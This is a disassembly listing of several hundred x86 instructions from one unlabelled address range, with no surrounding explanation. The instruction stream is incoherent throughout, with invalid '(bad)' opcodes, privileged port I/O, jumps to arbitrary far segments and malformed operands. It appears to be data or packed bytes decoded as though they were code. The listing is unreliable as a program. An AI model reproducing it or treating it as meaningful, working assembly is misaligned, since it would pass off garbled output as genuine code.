  41070b:	dec    ebp
  41070c:	in     eax,dx
  41070d:	mov    ds:0xd6ded8fb,al
  410712:	sub    DWORD PTR [eax],0x1
  410715:	xchg   esp,eax
  410716:	jo     0x41074f
  410718:	into   
  410719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41071a:	cmp    bl,BYTE PTR [ebx-0x2b14f154]
  410720:	jecxz  0x41079b
  410722:	popa   
  410723:	std    
  410724:	out    dx,eax
  410725:	fidivr DWORD PTR [ebp+0x6e]
  410728:	xchg   ebx,eax
  410729:	fs cdq 
  41072b:	dec    ebp
  41072c:	push   DWORD PTR [ebx]
  41072e:	fdivr  st,st(2)
  410730:	repnz xchg esi,eax
  410732:	sahf   
  410733:	or     eax,0x1aed0a86
  410738:	xor    al,0x48
  41073a:	fs adc al,0x62
  41073d:	stos   DWORD PTR es:[edi],eax
  41073e:	xor    DWORD PTR [eax+0x5c],ebx
  410741:	retf   
  410742:	push   esp
  410743:	(bad)  
  410744:	push   ecx
  410745:	lea    esi,[edx+0x7680d78d]
  41074b:	jnp    0x4106fc
  41074d:	jo     0x410708
  41074f:	sub    esi,DWORD PTR [edi+0x12fec858]
  410755:	push   edi
  410756:	xchg   edx,eax
  410757:	xchg   ebx,eax
  410758:	sub    bl,BYTE PTR [esp+eax*2]
  41075b:	popf   
  41075c:	adc    DWORD PTR [esi-0x30],edx
  41075f:	jg     0x4106e1
  410761:	jns    0x4107b9
  410763:	mov    dh,bh
  410765:	retf   
  410766:	test   BYTE PTR [edx+0x21],dh
  410769:	stc    
  41076a:	sahf   
  41076b:	add    al,0xd2
  41076d:	sub    eax,0x62cb08fd
  410772:	std    
  410773:	jo     0x410742
  410775:	mov    dh,0x50
  410777:	stos   BYTE PTR es:[edi],al
  410778:	sbb    al,0x57
  41077a:	and    esi,DWORD PTR [eax+0x395e94fb]
  410780:	gs js  0x41077b
  410783:	or     bl,BYTE PTR [ebx-0x18a58364]
  410789:	in     eax,dx
  41078a:	inc    eax
  41078b:	mov    ebx,0x2c47e24f
  410790:	mov    esp,ebp
  410792:	in     eax,dx
  410793:	lea    eax,[esp+ebp*4]
  410796:	enter  0xdb9c,0x84
  41079a:	jmp    0xbe35:0x177e84f7
  4107a1:	or     ebp,ecx
  4107a3:	dec    eax
  4107a4:	or     BYTE PTR [eax-0x20],0x34
  4107a8:	adc    BYTE PTR [ebp-0x55781d07],ch
  4107ae:	call   FWORD PTR [ebx]
  4107b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b1:	cld    
  4107b2:	add    DWORD PTR [esi-0x56],esp
  4107b5:	mov    BYTE PTR ds:0xf33c4af3,dl
  4107bb:	pop    edx
  4107bc:	fisubr WORD PTR [ebp-0x59f42bea]
  4107c2:	or     eax,0x298ca6cb
  4107c7:	pop    edx
  4107c8:	and    eax,0xd6f1432a
  4107cd:	int3   
  4107ce:	out    0x64,al
  4107d0:	dec    eax
  4107d1:	mov    al,ds:0x5b3abc74
  4107d6:	outs   dx,BYTE PTR ds:[esi]
  4107d7:	sti    
  4107d8:	aam    0x49
  4107da:	inc    ebx
  4107db:	xor    BYTE PTR [ebx+ebp*2-0x49752908],dl
  4107e2:	adc    BYTE PTR [ebx-0x4b],ch
  4107e5:	fucomip st,st(5)
  4107e7:	mov    WORD PTR [ecx-0x5ce855f],ds
  4107ed:	dec    esp
  4107ee:	xchg   BYTE PTR [edi+ebx*4-0x4],cl
  4107f2:	xchg   bp,ax
  4107f4:	push   cs
  4107f5:	cld    
  4107f6:	mov    esi,0x7df2f35
  4107fb:	jp     0x410806
  4107fd:	(bad)  [esp+edx*1+0x42c858d3]
  410804:	sub    eax,0x6aba41f1
  410809:	pop    ss
  41080a:	push   ds
  41080b:	into   
  41080c:	ficom  DWORD PTR [edi+edi*8-0x7cc263a1]
  410813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410814:	jge    0x41087c
  410816:	std    
  410817:	fimul  DWORD PTR [eax-0x40]
  41081a:	in     al,dx
  41081b:	mov    ds:0x46d98969,al
  410820:	in     eax,0xb3
  410822:	in     eax,0x15
  410824:	jns    0x410855
  410826:	or     ch,ch
  410828:	cmp    BYTE PTR [ebp+0x18ee96b],dl
  41082e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41082f:	sub    al,0x8d
  410831:	jge    0x41082d
  410833:	shl    cl,cl
  410835:	loop   0x4107dd
  410837:	inc    esp
  410838:	lahf   
  410839:	sbb    eax,DWORD PTR [eax+0x74]
  41083c:	pop    ds
  41083d:	imul   edx,DWORD PTR [edx+edx*1-0x168e3286],0xffffffdf
  410845:	or     DWORD PTR [ecx+0x1a],eax
  410848:	int    0x34
  41084a:	sti    
  41084b:	and    eax,0x63cdbec8
  410850:	mov    ch,0x7a
  410852:	pop    ebx
  410853:	fidiv  WORD PTR [eax]
  410855:	push   ds
  410856:	fstp   DWORD PTR [eax+0x744ce20e]
  41085c:	mov    ds:0xc442282b,eax
  410861:	sbb    al,0x20
  410863:	addr16 push esi
  410865:	jle    0x4108dc
  410867:	add    esi,DWORD PTR [ecx]
  410869:	retf   0x52e8
  41086c:	inc    edx
  41086d:	sub    eax,0xf1a39a8f
  410872:	add    ebx,DWORD PTR [edi-0x6653d31]
  410878:	(bad)  
  410879:	and    al,0xde
  41087b:	ins    BYTE PTR es:[edi],dx
  41087c:	push   eax
  41087d:	jg     0x4108d7
  41087f:	mov    ah,0x9e
  410881:	or     ebx,DWORD PTR [eax-0x485dc519]
  410887:	jbe    0x410814
  410889:	pop    esp
  41088a:	in     eax,dx
  41088b:	mov    ah,BYTE PTR [edx+0xdbf16b4]
  410891:	mov    bl,0x2
  410893:	fild   DWORD PTR [ebx-0x247bfbea]
  410899:	int3   
  41089a:	mov    ?,WORD PTR [ebp+0x23]
  41089d:	imul   edx,DWORD PTR [eax+eiz*2],0x52c95597
  4108a4:	pushf  
  4108a5:	mov    edi,esp
  4108a7:	xchg   esp,eax
  4108a8:	hlt    
  4108a9:	dec    ecx
  4108aa:	mov    edi,ebx
  4108ac:	loope  0x410848
  4108ae:	vpsubb ymm5,ymm5,ymm2
  4108b2:	mul    DWORD PTR [ebx+0x5951fde9]
  4108b8:	mov    edi,0x56319e8a
  4108bd:	sti    
  4108be:	ins    DWORD PTR es:[edi],dx
  4108bf:	fbld   TBYTE PTR [ebp-0x38]
  4108c2:	out    0x7b,al
  4108c4:	mov    gs,WORD PTR [edi+0x403f2963]
  4108ca:	mov    bl,0x3c
  4108cc:	call   0x240f5263
  4108d1:	mul    BYTE PTR [eax-0x37087c19]
  4108d7:	jo     0x410919
  4108d9:	je     0x4108b1
  4108db:	dec    edx
  4108dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108dd:	pop    eax
  4108de:	imul   esi,esi,0x7f
  4108e1:	(bad)
  4108e5:	push   es
  4108e6:	jnp    0x4108c5
  4108e8:	pop    ecx
  4108e9:	cdq    
  4108ea:	(bad)  ds:0xfdff3f
  4108f0:	into   
  4108f1:	fnstcw WORD PTR [ebx-0x25]
  4108f4:	mov    gs,WORD PTR [esi*2+0x21c22695]
  4108fb:	cmp    eax,0x4f894c67
  410900:	int    0x2c
  410902:	int    0x4
  410904:	es pop edx
  410906:	jno    0x41096e
  410908:	and    BYTE PTR [eax],al
  41090a:	scas   al,BYTE PTR es:[edi]
  41090b:	es mov ch,0xcd
  41090e:	jb     0x4108a8
  410910:	test   al,0xbd
  410912:	sbb    DWORD PTR [eax+ecx*4],esi
  410915:	imul   esp,DWORD PTR [ebp-0x63],0x8ff80d21
  41091c:	icebp  
  41091d:	in     eax,0x51
  41091f:	(bad)  
  410920:	(bad)  
  410921:	stos   DWORD PTR es:[edi],eax
  410922:	ret    0xd138
  410925:	popa   
  410926:	stos   DWORD PTR es:[edi],eax
  410927:	out    dx,al
  410928:	(bad)  
  410929:	cmp    ecx,DWORD PTR [ecx]
  41092b:	lahf   
  41092c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41092d:	jmp    0x410909
  41092f:	sbb    ebx,DWORD PTR [ebp+0x273763c8]
  410935:	xchg   edi,eax
  410936:	or     BYTE PTR [ebx],dl
  410938:	or     DWORD PTR [ebx+0x69c740e],ecx
  41093e:	aam    0xfe
  410940:	jb     0x41098a
  410942:	pusha  
  410943:	inc    ebx
  410944:	inc    ebp
  410945:	popa   
  410946:	neg    BYTE PTR ds:0x83337342
  41094c:	aam    0x8f
  41094e:	sti    
  41094f:	inc    esi
  410950:	popf   
  410951:	in     al,dx
  410952:	lahf   
  410953:	lods   al,BYTE PTR ds:[esi]
  410954:	test   edi,esp
  410956:	jmp    0x186a:0x6a920606
  41095d:	scas   al,BYTE PTR es:[edi]
  41095e:	frstor [eax]
  410960:	aad    0x84
  410962:	test   al,0x86
  410964:	inc    ebp
  410965:	pop    esi
  410966:	enter  0x4ff9,0x68
  41096a:	push   ebx
  41096b:	push   es
  41096c:	dec    eax
  41096d:	pop    es
  41096e:	daa    
  41096f:	mov    al,ds:0x690b0c0c
  410974:	loop   0x41092a
  410976:	mov    ds:0x9e7a20d2,eax
  41097b:	sar    BYTE PTR [ecx-0x13],cl
  41097e:	jmp    0x410939
  410980:	mov    ds:0xb54d67f,al
  410985:	fist   DWORD PTR [eax+0x4b82a181]
  41098b:	mov    edi,0x37563bc9
  410990:	les    ebx,FWORD PTR [ebp+0x43]
  410993:	dec    esp
  410994:	mov    al,0x3f
  410996:	lea    ebx,[eax]
  410998:	xchg   edi,eax
  410999:	imul   ebx,DWORD PTR [edx-0x2b],0x413c49e9
  4109a0:	test   BYTE PTR [edi-0x71fa8142],bl
  4109a6:	aas    
  4109a7:	ret    
  4109a8:	inc    BYTE PTR [esp+ebx*1-0x76]
  4109ac:	mov    ebx,0xca2e032c
  4109b1:	test   DWORD PTR [ebx+eiz*8],edi
  4109b4:	cmp    BYTE PTR [edx-0x18],0x36
  4109b8:	inc    esp
  4109b9:	popf   
  4109ba:	mov    eax,ds:0x641c36e0
  4109bf:	push   cs
  4109c0:	aaa    
  4109c1:	cmp    bh,BYTE PTR [ebx+0x3c0da3b5]
  4109c7:	mov    ebx,DWORD PTR [esi+edx*2-0x63b49ecf]
  4109ce:	stos   DWORD PTR es:[edi],eax
  4109cf:	xchg   esi,eax
  4109d0:	xchg   BYTE PTR [eax-0x76377cbc],cl
  4109d6:	push   0xb06f781f
  4109db:	and    eax,0x2a61613f
  4109e0:	mov    ebp,0x13e3eaf2
  4109e5:	and    al,0xc0
  4109e7:	retf   0x1b5
  4109ea:	dec    esp
  4109eb:	ret    
  4109ec:	addr16 mov esp,0xadf7666a
  4109f2:	jbe    0x410a45
  4109f4:	mov    esp,DWORD PTR [edx-0x39]
  4109f7:	icebp  
  4109f8:	sar    DWORD PTR [edx],0x6e
  4109fb:	jnp    0x4109e7
  4109fd:	mov    ch,0x99
  4109ff:	sub    dh,BYTE PTR [eax-0x631790d2]
  410a05:	mov    ebx,0x7526e5df
  410a0a:	jle    0x4109d2
  410a0c:	ins    BYTE PTR es:[edi],dx
  410a0d:	mov    ds:0x4b5cca7d,al
  410a12:	mov    edx,0x2ed0db34
  410a17:	add    ch,BYTE PTR [ebx]
  410a19:	lock and eax,0xfdaa90b3
  410a1f:	jmp    0x6ea66d64
  410a24:	mov    edi,0xa178c1e8
  410a29:	jmp    0x5717:0xc1d31134
  410a30:	and    cl,ch
  410a32:	xlat   BYTE PTR ds:[ebx]
  410a33:	mov    ds:0xb19f6e04,eax
  410a38:	test   al,0x6d
  410a3a:	in     al,dx
  410a3b:	aaa    
  410a3c:	fisttp WORD PTR [esi+0x4b41cd2b]
  410a42:	mov    edi,0x21b6af55
  410a47:	rcr    BYTE PTR [esi],0xf8
  410a4a:	test   dl,bh
  410a4c:	xchg   esp,eax
  410a4d:	lods   al,BYTE PTR ds:[esi]
  410a4e:	add    bh,al
  410a50:	mov    esi,DWORD PTR [eax-0x5518810]
  410a56:	(bad)  
  410a57:	jmp    DWORD PTR [esp+esi*8]
  410a5a:	sub    eax,0x400c333a
  410a5f:	adc    eax,0x64b71453
  410a64:	ss leave 
  410a66:	mov    WORD PTR [edi+0x5b],gs
  410a69:	jo     0x410ab7
  410a6b:	jo     0x4109fd
  410a6d:	xchg   ecx,eax
  410a6e:	adc    cl,BYTE PTR [ecx+0x15]
  410a71:	rcl    BYTE PTR [edx+0x30],0x12
  410a75:	stos   BYTE PTR es:[edi],al
  410a76:	push   edi
  410a77:	fwait
  410a78:	xchg   ebx,eax
  410a79:	jmp    0xeb2e:0x3f62d691
  410a80:	fs mov ss,esp
  410a83:	sub    eax,0x5446a195
  410a88:	(bad)  
  410a89:	(bad)  
  410a8b:	clc    
  410a8c:	mov    ah,0x85
  410a8e:	loopne 0x410ae5
  410a90:	add    eax,0x596a077e
  410a95:	pop    edx
  410a96:	inc    eax
  410a97:	push   cs
  410a98:	retf   0xc83b
  410a9b:	loop   0x410b11
  410a9d:	jecxz  0x410ad9
  410a9f:	sbb    dl,bl
  410aa1:	mov    ch,0x6f
  410aa3:	jbe    0x410ab5
  410aa5:	(bad)  
  410aa6:	enter  0xb58c,0xd5
  410aaa:	mov    ds,WORD PTR [esi-0x46]
  410aad:	call   0x3fba:0x7e7d5f74
  410ab4:	cmp    bl,BYTE PTR [ebx+0x45]
  410ab7:	dec    esi
  410ab8:	and    ch,BYTE PTR gs:[esi+0xb]
  410abc:	test   al,0xfc
  410abe:	adc    cl,dh
  410ac0:	sub    DWORD PTR [edi+0x3ec20908],0x1de2ee3c
  410aca:	mov    eax,ds:0xa777b8a5
  410acf:	push   eax
  410ad0:	pop    ebp
  410ad1:	adc    eax,0x1f03ea66
  410ad6:	inc    edi
  410ad7:	outs   dx,BYTE PTR ds:[esi]
  410ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad9:	cmp    DWORD PTR [edi-0x75c457e],esp
  410adf:	lock daa 
  410ae1:	cli    
  410ae2:	aad    0xfa
  410ae4:	mov    ch,0xbb
  410ae6:	ds push ebp
  410ae8:	mov    bl,0x2f
  410aea:	pop    edx
  410aeb:	out    dx,eax
  410aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aed:	ror    DWORD PTR [edx+ebx*8+0x5],0x1b
  410af2:	xor    al,BYTE PTR ds:[edx]
  410af5:	stos   BYTE PTR es:[edi],al
  410af6:	or     esp,DWORD PTR [esi+0x65]
  410af9:	pop    ecx
  410afa:	sbb    edi,DWORD PTR cs:[esi+ebp*4-0x7d]
  410aff:	ja     0x410abf
  410b01:	(bad)  
  410b02:	or     esi,DWORD PTR [ecx+0x7068e7ef]
  410b08:	into   
  410b09:	push   ebp
  410b0a:	retf   0x6a42
  410b0d:	push   cs
  410b0e:	cmp    eax,0x6991a
  410b13:	or     al,0xb5
  410b15:	out    dx,eax
  410b16:	xchg   ecx,eax
  410b17:	cld    
  410b18:	mov    al,ds:0x86e687af
  410b1d:	xor    cl,BYTE PTR [ebp+0x3d]
  410b20:	jo     0x410b66
  410b22:	or     DWORD PTR [edx-0x6e34a656],edi
  410b28:	popa   
  410b29:	xor    bl,dh
  410b2b:	out    dx,al
  410b2c:	test   eax,0x76c4711c
  410b31:	mov    dl,0x60
  410b33:	push   edi
  410b34:	sub    ah,BYTE PTR [edi+eiz*8-0x4e432740]
  410b3b:	out    dx,eax
  410b3c:	test   DWORD PTR [ecx],ebx
  410b3e:	imul   esp,DWORD PTR [ecx+ebp*4+0x71],0x1726ac75
  410b46:	mov    ds,WORD PTR [eax+0x40]
  410b49:	push   0xc52015ae
  410b4e:	fist   DWORD PTR [esi+eiz*8+0x9]
  410b52:	push   esi
  410b53:	in     al,0x17
  410b55:	(bad)  
  410b56:	fwait
  410b57:	cmp    dh,ch
  410b59:	call   DWORD PTR [esp+eax*8]
  410b5c:	mov    eax,0xfbc889ca
  410b61:	out    0x57,eax
  410b63:	jnp    0x410b3f
  410b65:	sbb    ecx,esi
  410b67:	outs   dx,BYTE PTR ds:[esi]
  410b68:	bound  ebx,QWORD PTR [ecx+0x4e]
  410b6b:	nop
  410b6c:	fisub  WORD PTR [edi+0x7e620f23]
  410b72:	adc    DWORD PTR [edi+0x4d6e79a1],esi
  410b78:	xor    edi,DWORD PTR [edi+0x37]
  410b7b:	and    eax,0x61add531
  410b80:	add    eax,0xf8e2bb8f
  410b85:	mov    ah,0x61
  410b87:	jg     0x410b6d
  410b89:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b8b:	adc    BYTE PTR [eax+ebx*2-0x46],bl
  410b8f:	cmc    
  410b90:	inc    esp
  410b91:	cmp    eax,0xf61ec462
  410b96:	and    al,0xd
  410b98:	ds sub esi,0xd4be2b2b
  410b9f:	repnz or BYTE PTR [eax],ch
  410ba2:	jns    0x410b3b
  410ba4:	inc    ebx
  410ba5:	jge    0x410bc6
  410ba7:	and    ch,ch
  410ba9:	or     esp,ebp
  410bab:	mov    ebp,0xc9dc6376
  410bb0:	mov    ds:0xf2de8bc1,al
  410bb5:	(bad)  
  410bb6:	into   
  410bb7:	adc    BYTE PTR [ebp-0x7eeeaa26],cl
  410bbd:	aaa    
  410bbe:	jns    0x410bab
  410bc0:	push   eax
  410bc1:	inc    esp
  410bc2:	clc    
  410bc3:	retf   
  410bc4:	push   esi
  410bc5:	ret    
  410bc6:	(bad)  
  410bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bc8:	fcomp  DWORD PTR [ebx]
  410bca:	and    dh,BYTE PTR [eax]
  410bcc:	or     eax,0x4e40db2b
  410bd1:	push   ecx
  410bd2:	inc    ebx
  410bd3:	sbb    eax,0xb3f872ba
  410bd8:	and    BYTE PTR [esp+ecx*8],dh
  410bdb:	jne    0x410b94
  410bdd:	shl    BYTE PTR [eax+0x34],1
  410be0:	inc    edi
  410be1:	sbb    eax,0x2cb8c5cd
  410be6:	gs push esp
  410be8:	clc    
  410be9:	dec    edx
  410bea:	xchg   DWORD PTR [esi+eax*8-0x2a],eax
  410bee:	ret    
  410bef:	clc    
  410bf0:	mov    edx,0x71ad3aa0
  410bf5:	lods   eax,DWORD PTR ds:[esi]
  410bf6:	scas   eax,DWORD PTR es:[edi]
  410bf7:	lods   al,BYTE PTR ds:[esi]
  410bf8:	mov    eax,ds:0xedc59568
  410bfd:	stos   BYTE PTR es:[edi],al
  410bfe:	mov    DWORD PTR [edx-0x466c5ba1],ebx
  410c04:	push   esp
  410c05:	jnp    0x410bde
  410c07:	dec    eax
  410c08:	or     esi,ebx
  410c0a:	dec    BYTE PTR [ebx+0x42461d64]
  410c10:	push   ecx
  410c11:	test   BYTE PTR [eax-0x1b],bh
  410c14:	add    ch,BYTE PTR [ebx-0x2b2a652c]
  410c1a:	gs imul esp,eax,0x36
  410c1e:	dec    ecx
  410c1f:	mov    eax,ds:0xeb9f6ed4
  410c24:	fisubr WORD PTR [ebp-0x52]
  410c27:	push   es
  410c28:	and    BYTE PTR [edx+edi*4+0xe],al
  410c2c:	mov    ah,0x94
  410c2e:	bound  esp,QWORD PTR [eax]
  410c30:	fldcw  WORD PTR [ecx+0x4bfb1358]
  410c36:	mov    eax,0xfa90f32d
  410c3b:	inc    ecx
  410c3c:	test   DWORD PTR [ecx+0x6c],eax
  410c3f:	mov    bl,0x4c
  410c41:	jnp    0x410c97
  410c43:	cmp    DWORD PTR [ebx+0x652c42fd],0x582eefeb
  410c4d:	and    ah,dl
  410c4f:	mov    ebp,0x3a08afdb
  410c54:	or     DWORD PTR [edx-0x461d5eeb],eax
  410c5a:	in     al,0x6e
  410c5c:	xchg   ecx,eax
  410c5d:	test   BYTE PTR [ebx],al
  410c5f:	fcomp  QWORD PTR [edi+0x13d0ca5e]
  410c65:	in     eax,0xb4
  410c67:	cmp    DWORD PTR [edi-0x72abd67f],ecx
  410c6d:	xchg   edi,eax
  410c6e:	addr16 out 0x34,eax
  410c71:	ficomp WORD PTR [ecx-0x5ca303d5]
  410c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c78:	call   0x869d3bfe
  410c7d:	int    0x61
  410c7f:	imul   ebx,DWORD PTR [esi+0x14500338],0xd44a6145
  410c89:	mov    al,0xb0
  410c8b:	cli    
  410c8c:	add    esi,DWORD PTR [edi+edx*4]
  410c8f:	xor    DWORD PTR [edx-0x6a9d5bba],edx
  410c95:	jo     0x410cc9
  410c97:	sub    BYTE PTR [ecx+0x8],ah
  410c9a:	pop    es
  410c9b:	jmp    DWORD PTR [ecx-0x7f]
  410c9e:	add    al,0xff
  410ca0:	sub    eax,0xa6a42b28
  410ca5:	neg    ecx
  410ca7:	(bad)  
  410ca8:	push   eax
  410ca9:	pop    edi
  410caa:	xor    BYTE PTR [esi],bl
  410cac:	out    dx,eax
  410cad:	pop    ebx
  410cae:	enter  0xdeeb,0x7c
  410cb2:	repnz mov gs:0x870ffcb6,eax
  410cb9:	or     al,0x4b
  410cbb:	push   ecx
  410cbc:	or     ah,cl
  410cbe:	(bad)  
  410cbf:	or     eax,0xebeb0de8
  410cc4:	mov    ds:0xeab89baf,eax
  410cc9:	jp     0x410d10
  410ccb:	scas   al,BYTE PTR es:[edi]
  410ccc:	jnp    0x410c5a
  410cce:	xor    al,0x22
  410cd0:	jmp    0x421a:0x7751b68e
  410cd7:	(bad)  
  410cd8:	mov    dh,0xa8
  410cda:	test   BYTE PTR [edx-0x4d],0xa4
  410cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cdf:	int    0xbd
  410ce1:	cwde   
  410ce2:	mov    eax,ds:0xbd82c4c8
  410ce7:	fldlg2 
  410ce9:	test   eax,0xbc41ae80
  410cee:	mov    DWORD PTR [eax+0x43],ecx
  410cf1:	nop
  410cf2:	cmp    al,0x14
  410cf4:	loopne 0x410d5a
  410cf6:	out    0xb2,al
  410cf8:	ja     0x410c92
  410cfa:	cmp    esp,0x95d28092
  410d00:	push   edi
  410d01:	jcxz   0x410d55
  410d04:	rcl    DWORD PTR [ecx+0x6180950e],1
  410d0a:	jecxz  0x410d37
  410d0c:	jno    0x410d7e
  410d0e:	or     DWORD PTR [edx+0x38],0xa1f2d38b
  410d15:	xchg   BYTE PTR [ecx+0x4d],ah
  410d18:	sbb    DWORD PTR [esi+ebx*4-0x2b66f718],ebx
  410d1f:	shl    DWORD PTR [edx-0x3d],1
  410d22:	and    edx,DWORD PTR [ebx-0x249ce801]
  410d28:	cld    
  410d29:	sbb    ebx,DWORD PTR [ecx-0x68]
  410d2c:	inc    esp
  410d2d:	mov    BYTE PTR [edi-0x362d83b9],ch
  410d33:	push   esp
  410d34:	and    al,0xbb
  410d36:	mov    dl,0x5b
  410d38:	adc    dl,0xf9
  410d3b:	mov    dl,0x3d
  410d3d:	mov    ebp,0xb5c030
  410d42:	sar    DWORD PTR [edi+ecx*8-0x58191ac3],1
  410d49:	stc    
  410d4a:	push   cs
  410d4b:	out    0x5a,eax
  410d4d:	fcmovnb st,st(6)
  410d4f:	add    BYTE PTR [ecx+0x5820b9dd],dl
  410d55:	je     0x410d23
  410d57:	mov    ah,0x88
  410d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d5a:	pop    eax
  410d5b:	cdq    
  410d5c:	cli    
  410d5d:	sti    
  410d5e:	inc    ebx
  410d5f:	leave  
  410d60:	gs cwde 
  410d62:	fnsetpm(287 only) 
  410d64:	jbe    0x410d27
  410d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d67:	cmp    al,0xc2
  410d69:	ins    DWORD PTR es:[edi],dx
  410d6a:	mov    ds,ecx
  410d6c:	aas    
  410d6d:	xchg   edx,eax
  410d6e:	add    ebx,eax
  410d70:	inc    ecx
  410d71:	scas   al,BYTE PTR es:[edi]
  410d72:	sbb    edx,DWORD PTR [ecx+ebx*1-0x95a407]
  410d79:	cs and bl,cl
  410d7c:	jns    0x410d5e
  410d7e:	cmp    DWORD PTR [ebx],0xffffffa9
  410d81:	aaa    
  410d82:	ins    BYTE PTR es:[edi],dx
  410d83:	mov    ah,0xd1
  410d85:	xchg   BYTE PTR [esi],dl
  410d87:	push   ds
  410d88:	gs push ds
  410d8a:	(bad)  
  410d8b:	lds    esp,FWORD PTR [ebx]
  410d8d:	dec    eax
  410d8e:	cmp    al,0x9e
  410d90:	clc    
  410d91:	pop    ebx
  410d92:	xchg   esp,eax
  410d93:	sahf   
  410d94:	sub    BYTE PTR ds:0x74ef7483,dl
  410d9a:	sub    ebp,DWORD PTR [edx]
  410d9c:	lods   al,BYTE PTR ds:[esi]
  410d9d:	adc    esi,DWORD PTR [eax+0x4c]
  410da0:	lock out dx,eax
  410da2:	add    edx,DWORD PTR [ebx+0x3a944794]
  410da8:	xor    esi,esp
  410daa:	test   BYTE PTR [esi],0x7f
  410dad:	xchg   esp,eax
  410dae:	sub    BYTE PTR [ecx],al
  410db0:	outs   dx,DWORD PTR ds:[esi]
  410db1:	ins    BYTE PTR es:[edi],dx
  410db2:	jmp    0x921e6b36
  410db7:	out    0xf2,eax
  410db9:	dec    eax
  410dba:	jg     0x410e16
  410dbc:	and    ah,bh
  410dbe:	ins    BYTE PTR es:[edi],dx
  410dbf:	stos   DWORD PTR es:[edi],eax
  410dc0:	cmp    DWORD PTR [edx-0x20b63e45],eax
  410dc6:	popf   
  410dc7:	cmp    al,BYTE PTR [eax]
  410dc9:	test   BYTE PTR [edx+0x7],ch
  410dcc:	pop    edx
  410dcd:	sar    ch,0x87
  410dd0:	sar    BYTE PTR [ebx],cl
  410dd2:	clc    
  410dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dd4:	mov    BYTE PTR [edi],dh
  410dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd7:	xchg   ecx,eax
  410dd8:	jae    0x410e36
  410dda:	retf   0x3a89
  410ddd:	imul   edx,DWORD PTR [edi-0x57bd0b4a],0x35
  410de4:	call   0xbb04f8a1
  410de9:	push   ebp
  410dea:	nop
  410deb:	xchg   esi,eax
  410dec:	mov    al,ds:0xf2bccf22
  410df1:	aad    0xc1
  410df3:	xor    al,0x7f
  410df5:	pop    ebp
  410df6:	sbb    DWORD PTR [edx-0x8],ecx
  410df9:	xor    ebp,0xb3d79c29
  410dff:	mov    cl,0xce
  410e01:	push   ecx
  410e02:	jae    0x410e82
  410e04:	std    
  410e05:	jae    0x410e44
  410e07:	les    esi,FWORD PTR [edx+0x6f74631b]
  410e0d:	fucompp 
  410e0f:	test   DWORD PTR [edi],edi
  410e11:	mov    dl,0xeb
  410e13:	inc    esi
  410e14:	adc    al,0x82
  410e16:	pop    esp
  410e17:	pop    edi
  410e18:	retf   
  410e19:	cs out 0xd,al
  410e1c:	in     eax,0x89
  410e1e:	mov    cl,BYTE PTR [eax+0x40a7d041]
  410e24:	push   es
  410e25:	icebp  
  410e26:	cwde   
  410e27:	in     eax,dx
  410e28:	test   ecx,edx
  410e2a:	in     al,dx
  410e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e2c:	mov    edi,?
  410e2e:	inc    ebp
  410e2f:	rcl    BYTE PTR [ecx+0x1a],0xbd
  410e33:	scas   eax,DWORD PTR es:[edi]
  410e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e35:	mov    ch,0xb8
  410e37:	test   BYTE PTR [eax+0x79],cl
  410e3a:	pop    ebx
  410e3b:	pop    ecx
  410e3c:	jg     0x410eb9
  410e3e:	call   0xc8cfde34
  410e43:	pop    ecx
  410e44:	add    al,0xd
  410e46:	call   0x84bf0aa2
  410e4b:	mov    ebx,0x6b753791
  410e50:	jnp    0x410e7c
  410e52:	jp     0x410eb8
  410e54:	xchg   ecx,eax
  410e55:	les    esi,FWORD PTR [ecx+0x32a89008]
  410e5b:	cmp    al,0xb4
  410e5d:	ret    0xdda
  410e60:	dec    eax
  410e61:	and    al,0x81
  410e63:	inc    esp
  410e64:	lods   eax,DWORD PTR ds:[esi]
  410e65:	and    BYTE PTR [ecx],bh
  410e67:	(bad)  
  410e68:	dec    esp
  410e69:	aaa    
  410e6a:	fmulp  st(6),st
  410e6c:	mov    bl,0xe3
  410e6e:	push   esi
  410e70:	jl     0x410e9b
  410e72:	popa   
  410e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e74:	retf   0x87cd
  410e77:	mov    cl,0xe3
  410e79:	gs stos BYTE PTR es:[edi],al
  410e7b:	mov    BYTE PTR [edx-0x6a],dl
  410e7e:	imul   DWORD PTR [ebp+ecx*2+0x2a]
  410e82:	and    al,0xaf
  410e84:	fs push esp
  410e86:	(bad)  [eax-0x4dc89993]
  410e8c:	mov    edx,0x758d7bfb
  410e91:	sub    ebp,DWORD PTR [edi]
  410e93:	mov    al,ds:0x3222a6d1
  410e98:	lea    ebx,[esi+0x3]
  410e9b:	mov    BYTE PTR [ebp+0x5286d18e],ch
  410ea1:	out    dx,al
  410ea2:	fnstcw WORD PTR [edx+edx*8+0x5efba812]
  410ea9:	xchg   ebp,eax
  410eaa:	fdivr  QWORD PTR [edi]
  410eac:	shl    DWORD PTR [edi-0x49],1
  410eaf:	bound  esi,QWORD PTR [esi]
  410eb1:	sub    bl,BYTE PTR [edi-0x2207092b]
  410eb7:	xchg   esp,eax
  410eb8:	sub    BYTE PTR [ecx-0x49],cl
  410ebb:	push   bx
  410ebd:	adc    BYTE PTR [ebx],ah
  410ebf:	xor    esp,edx
  410ec1:	sub    BYTE PTR fs:[eax],bh
  410ec4:	lods   al,BYTE PTR ds:[esi]
  410ec5:	fidiv  DWORD PTR [ebp-0x56402a52]
  410ecb:	jmp    0xb3daa62b
  410ed0:	or     eax,0x55e292fb
  410ed5:	loop   0x410eba
